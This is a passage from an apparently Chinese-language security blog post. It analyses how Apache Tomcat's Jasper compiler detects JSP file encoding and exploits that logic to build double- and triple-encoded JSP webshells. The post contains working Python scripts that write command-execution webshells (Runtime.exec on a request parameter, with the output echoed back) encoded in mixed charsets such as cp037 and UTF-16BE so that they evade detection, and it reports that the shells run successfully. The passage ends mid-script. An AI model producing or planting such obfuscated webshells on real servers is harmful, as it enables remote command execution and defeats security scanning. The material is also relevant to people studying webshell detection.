class="keyword">this</span>.isEncodingSetInProlog),</span><br><span class="line">                       Boolean.valueOf(<span class="keyword">this</span>.isBomPresent),</span><br><span class="line">                       Integer.valueOf(<span class="keyword">this</span>.skip) &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里有两个关键函数，它们都能决定整个文件内容的编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createInitialReader();</span><br><span class="line">scanXMLDecl();</span><br></pre></td></tr></table></figure><p>其中<code>createInitialReader</code>作用有两个一个是根据前四个字节(bom)决定encoding也就是编码，接着往里看在<code>org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingName</code>中</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/1.png"></p><p>逻辑很简单，就是根据前4个字节顺序标记判定文件编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object[] getEncodingName(<span class="keyword">byte</span>[] b4, <span class="keyword">int</span> count) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">null</span>, Boolean.FALSE, Integer.valueOf(<span class="number">0</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> b0 = b4[<span class="number">0</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="keyword">int</span> b1 = b4[<span class="number">1</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0xFE</span> &amp;&amp; b1 == <span class="number">0xFF</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-16BE&quot;</span>, Boolean.TRUE, Integer.valueOf(<span class="number">2</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0xFF</span> &amp;&amp; b1 == <span class="number">0xFE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-16LE&quot;</span>, Boolean.FALSE, Integer.valueOf(<span class="number">2</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (count &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">null</span>, Boolean.FALSE, Integer.valueOf(<span class="number">0</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> b2 = b4[<span class="number">2</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0xEF</span> &amp;&amp; b1 == <span class="number">0xBB</span> &amp;&amp; b2 == <span class="number">0xBF</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">null</span>, Integer.valueOf(<span class="number">3</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (count &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">null</span>, Integer.valueOf(<span class="number">0</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> b3 = b4[<span class="number">3</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x00</span> &amp;&amp; b1 == <span class="number">0x00</span> &amp;&amp; b2 == <span class="number">0x00</span> &amp;&amp; b3 == <span class="number">0x3C</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, Boolean.TRUE, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x3C</span> &amp;&amp; b1 == <span class="number">0x00</span> &amp;&amp; b2 == <span class="number">0x00</span> &amp;&amp; b3 == <span class="number">0x00</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, Boolean.FALSE, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x00</span> &amp;&amp; b1 == <span class="number">0x00</span> &amp;&amp; b2 == <span class="number">0x3C</span> &amp;&amp; b3 == <span class="number">0x00</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, <span class="keyword">null</span>, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x00</span> &amp;&amp; b1 == <span class="number">0x3C</span> &amp;&amp; b2 == <span class="number">0x00</span> &amp;&amp; b3 == <span class="number">0x00</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, <span class="keyword">null</span>, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x00</span> &amp;&amp; b1 == <span class="number">0x3C</span> &amp;&amp; b2 == <span class="number">0x00</span> &amp;&amp; b3 == <span class="number">0x3F</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-16BE&quot;</span>, Boolean.TRUE, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x3C</span> &amp;&amp; b1 == <span class="number">0x00</span> &amp;&amp; b2 == <span class="number">0x3F</span> &amp;&amp; b3 == <span class="number">0x00</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-16LE&quot;</span>, Boolean.FALSE, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">0x4C</span> &amp;&amp; b1 == <span class="number">0x6F</span> &amp;&amp; b2 == <span class="number">0xA7</span> &amp;&amp; b3 == <span class="number">0x94</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;CP037&quot;</span>, <span class="keyword">null</span>, Integer.valueOf(<span class="number">4</span>)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Object [] &#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">null</span>, Boolean.FALSE, Integer.valueOf(<span class="number">0</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>createInitialReader</code>另一个作用就是初始化Reader对象(<code>reader = createReader(stream, encoding, isBigEndian)</code>)，在Reader里面带有我们对文件编码以及字节序列大小端的关键信息，为下一步调用<code>scanXMLDecl</code>扫描解析xml的申明内容做了一个前置准备，在<code>scanXMLDecl</code>当中我们其实只需要关注和编码相关的属性(Ps:具体逻辑可以自己看看代码也比较简单，这里相关度不高不多提)，也就是上面xml小节里面提到的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面xml属性的encoding也可以决定整个文件的编码内容，同时我们可以发现这个encoding可以覆盖掉上一步的函数<code>createInitialReader();</code>(通过前四字节识别出的编码识别的encoding)，因此配合这个我们也可以构造出一种新的双编码jspwebshell，最后会提到</p><h4 id="无法根据前四个字节判断文本编码怎么办"><a href="#无法根据前四个字节判断文本编码怎么办" class="headerlink" title="无法根据前四个字节判断文本编码怎么办"></a>无法根据前四个字节判断文本编码怎么办</h4><p>当无法根据前四个字节判断文本编码时，jsp还提供了另一种方式帮助识别编码，对应下图中的<code>getPageEncodingForJspSyntax</code></p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/4.png"></p><p>有兴趣看看这个函数的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getPageEncodingForJspSyntax</span><span class="params">(JspReader jspReader,</span></span></span><br><span class="line"><span class="params"><span class="function">            Mark startMark)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> JasperException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String encoding = <span class="keyword">null</span>;</span><br><span class="line">        String saveEncoding = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        jspReader.reset(startMark);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (jspReader.skipUntil(<span class="string">&quot;&lt;&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (jspReader.matches(<span class="string">&quot;%--&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (jspReader.skipUntil(<span class="string">&quot;--%&gt;&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">boolean</span> isDirective = jspReader.matches(<span class="string">&quot;%@&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (isDirective) &#123;</span><br><span class="line">                jspReader.skipSpaces();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                isDirective = jspReader.matches(<span class="string">&quot;jsp:directive.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!isDirective) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (jspReader.matches(<span class="string">&quot;tag &quot;</span>) || jspReader.matches(<span class="string">&quot;page&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                jspReader.skipSpaces();</span><br><span class="line">                Attributes attrs = Parser.parseAttributes(<span class="keyword">this</span>, jspReader);</span><br><span class="line">                encoding = getPageEncodingFromDirective(attrs, <span class="string">&quot;pageEncoding&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                encoding = getPageEncodingFromDirective(attrs, <span class="string">&quot;contentType&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    saveEncoding = encoding;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (encoding == <span class="keyword">null</span>) &#123;</span><br><span class="line">            encoding = saveEncoding;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> encoding;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>课代表直接总结了，简单来说最终其实就是根据文本内容中的pageEncoding的值来决定最终编码，这里有两种写法</p><p>第一种</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;utf-16be&quot;</span>%&gt;</span><br><span class="line">或</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;charset=utf-16be&quot;</span> %&gt;</span><br><span class="line">或</span><br><span class="line">&lt;%@ tag language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;utf-16be&quot;</span>%&gt;</span><br><span class="line">或</span><br><span class="line">&lt;%@ tag contentType=<span class="string">&quot;charset=utf-16be&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page pageEncoding=<span class="string">&quot;utf-16be&quot;</span>/&gt;</span><br><span class="line">或</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">&quot;charset=utf-16be&quot;</span>/&gt;</span><br><span class="line">或</span><br><span class="line">&lt;jsp:directive.tag pageEncoding=<span class="string">&quot;utf-16be&quot;</span>/&gt;</span><br><span class="line">或</span><br><span class="line">&lt;jsp:directive.tag contentType=<span class="string">&quot;charset=utf-16be&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>同时如果使用的<code>page</code>后面可以不需要空格,也就是形如<code>&lt;%@ pagepageEncoding=&quot;utf-16be&quot; %&gt;</code>或<code>&lt;jsp:directive.pagepageEncoding=&quot;utf-16be&quot;/&gt;</code>具体可以看看代码的解析这部分不重要</p><p>因此看到这里你就知道为什么开头提到的phithon提供的demo能够成功解析的原因了<img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/0.png"></p><p>第二种</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/5.png"></p><p>第三种</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/9.png"></p><h4 id="为什么上面这个有一定局限性"><a href="#为什么上面这个有一定局限性" class="headerlink" title="为什么上面这个有一定局限性"></a>为什么上面这个有一定局限性</h4><p>实际上如果你认真看了上面的代码你会发现决定具体代码逻辑是否能走到这一步和<code>isBomPresent</code>的值密不可分，我们也说到了只有文件前四个字节无法与<code>org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingName</code>这个方法中某个编码匹配，之后假定XML文挡采用UTF-8编码，最终才能保证<code>isBomPresent</code>为false，因此这种利用的局限性在于文件头只能是utf8格式才能保证代码逻辑的正确执行</p><h4 id="更灵活的双编码jspwebshell"><a href="#更灵活的双编码jspwebshell" class="headerlink" title="更灵活的双编码jspwebshell"></a>更灵活的双编码jspwebshell</h4><p>根据我们前面的分析，下面这种方式实现双编码会更灵活，可以更多样地选择双编码间的组合</p><p>这里简单写个python生成一个即可作为演示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a0 = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">a1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot;</span></span><br><span class="line"><span class="string">          version=&quot;1.2&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;jsp:directive.page contentType=&quot;text/html&quot;/&gt;</span></span><br><span class="line"><span class="string">    &lt;jsp:declaration&gt;</span></span><br><span class="line"><span class="string">    &lt;/jsp:declaration&gt;</span></span><br><span class="line"><span class="string">    &lt;jsp:scriptlet&gt;</span></span><br><span class="line"><span class="string">Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span></span><br><span class="line"><span class="string">java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));</span></span><br><span class="line"><span class="string">String line = &quot;&quot;;</span></span><br><span class="line"><span class="string">while ((line = input.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">  out.write(line+&quot;\\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/jsp:scriptlet&gt;</span></span><br><span class="line"><span class="string">    &lt;jsp:text&gt;</span></span><br><span class="line"><span class="string">    &lt;/jsp:text&gt;</span></span><br><span class="line"><span class="string">&lt;/jsp:root&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.jsp&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(a0.encode(<span class="string">&quot;utf-16&quot;</span>))</span><br><span class="line">    f.write(a1.encode(<span class="string">&quot;cp037&quot;</span>))</span><br></pre></td></tr></table></figure><p>简单测试没毛病</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/2.png"></p><p>访问测试</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/3.png"></p><p>多说一下这里也只是相对灵活，从执行逻辑来看必须要是<code>XMLEncodingDetector#getEncodingName</code>能够识别的范围才行，因此在我这个版本中其实对应着<code>UTF-8\UTF-16BE\UTF-16LE\ISO-10646-UCS-4\CP037</code>作为前置编码，当然后置就无所谓啦基本上java中的都行</p><h4 id="避免双编码踩坑"><a href="#避免双编码踩坑" class="headerlink" title="避免双编码踩坑"></a>避免双编码踩坑</h4><p>这里面有一个很大的坑！什么坑呢？</p><p>这里我们以前置cp037+后置utf-16为例进行说明</p><p>我们看看前置部分，通常我们在写前置部分的时候不会在意其长度，比如下面的代码输出长度为41，这就是一个巨大的坑点！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a0 = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;utf-16be&#x27;?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a0.encode(<span class="string">&quot;cp037&quot;</span>)))</span><br></pre></td></tr></table></figure><p>为什么？我们前面说过在后面通过文件内容判断是否为xml格式时，是通过检查里面是否含有<code>&lt;xxx:root</code>这样的代码片段来进行判断，但是我们可以看看红色箭头，这里是直接把整个文件内容放在jspReader当中做解码</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/6.png"></p><p>这意味着什么，我们刚刚说了前面部分长度是单数，而对于我们的utf-16是两个字节去解码，这就导致</p><p>本来这里应该是<code>003c</code>作为一个整体，由于前面<code>c3p0</code>编码后长度为单数，导致最终为<code>3c00</code>去做了解码，因此最终导致识别不到<code>&lt;xxx:root</code>这样的代码片段，就导致程序认为这并不是一个xml格式的写法</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/7.png"></p><p>最终在<code>org.apache.jasper.compiler.ParserController#doParse</code>做解析并拼接jsp模板的时候无法成为正确的代码，而识别不到正确的格式就导致执行下面分支出错，原本该是执行的代码变成了一堆乱码显示到页面中(有兴趣可以看看下面)这个分支中具体的解析流程也蛮有意思)</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/8.png"></p><h4 id="任意放置的jspReader-matches与"><a href="#任意放置的jspReader-matches与" class="headerlink" title="任意放置的jspReader.matches与%@"></a>任意放置的jspReader.matches与%@</h4><p>刚刚我们只提到了这两个标签的利用具有编码的局限性，然而如果你再仔细看我们后面提出的两种新的编码利用会发现在函数<code>getPageEncodingForJspSyntax</code>中，它通过while循环不断往后查找符号<code>&lt;</code>，之后在调用<code>jspReader.matches</code>寻找<code>%@</code>或<code>jsp:directive.</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getPageEncodingForJspSyntax</span><span class="params">(JspReader jspReader,</span></span></span><br><span class="line"><span class="params"><span class="function">            Mark startMark)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> JasperException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function">xxxx</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="params">(<span class="keyword">true</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (jspReader.skipUntil(<span class="string">&quot;&lt;&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">xxxx</span><br><span class="line">            <span class="keyword">boolean</span> isDirective = jspReader.matches(<span class="string">&quot;%@&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (isDirective) &#123;</span><br><span class="line">                jspReader.skipSpaces();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                isDirective = jspReader.matches(<span class="string">&quot;jsp:directive.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!isDirective) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">           xxxx</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此从这里我们可以看出<code>&lt;jsp:directive.</code>或<code>&lt;%@</code>并没有要求在某个具体的位置，因此它可以在最前面，可以在中间甚至可以在最后面</p><p>这里我们可以验证下，这里我们把它藏在了一个变量当中</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/10.png"></p><p>测试demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a0 = <span class="string">&#x27;&#x27;&#x27;&lt;%</span></span><br><span class="line"><span class="string">    Process p = Runtime.getRuntime().exec(request.getParameter(&quot;y4tacker&quot;));</span></span><br><span class="line"><span class="string">    java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));</span></span><br><span class="line"><span class="string">    String line = &quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">a1 = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">a2 = <span class="string">&#x27;&#x27;&#x27;&quot;;</span></span><br><span class="line"><span class="string">    while ((line = input.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.write(line+&quot;\\n&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test2.jsp&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(a0.encode(<span class="string">&quot;utf-16be&quot;</span>))</span><br><span class="line">    f.write(a1.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    f.write(a2.encode(<span class="string">&quot;utf-16be&quot;</span>))</span><br></pre></td></tr></table></figure><p>成功利用<img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/11.png"></p><h4 id="三重编码"><a href="#三重编码" class="headerlink" title="三重编码"></a>三重编码</h4><p>在上面的基础上我们还可以进一步利用，为什么呢？我们知道它在识别标签<code>&lt;jsp:directive.</code>或<code>&lt;%@</code>的过程中是调用了<code>jspReader.xxx</code>去实现的，而这个<code>jspReader</code>来源于前面的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JspReader jspReader = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  jspReader = <span class="keyword">new</span> JspReader(ctxt, absFileName, sourceEnc, jar, err);</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException ex) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> JasperException(ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>聪明的你一定能看出这里的<code>sourceEnc</code>是我们可以控制的(前面讲过了忘了往上翻复习下)</p><p>因此我们对整个利用梳理一下</p><ol><li>保证无法通过BOM识别出文本内容编码(保证isBomPresent为false)</li><li>通过<code>&lt;?xml encoding=&#39;xxx&#39;</code>可以控制<code>sourceEnc</code>的值</li><li>将标签<code>&lt;jsp:directive.</code>或<code>&lt;%@</code>放置在全文任意位置但不影响代码解析</li><li>通过标签<code>&lt;jsp:directive.</code>或<code>&lt;%@</code>的<code>pageEncoding</code>属性再次更改文本内容编码</li></ol><p>这里我按要求随便写了一个符合的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 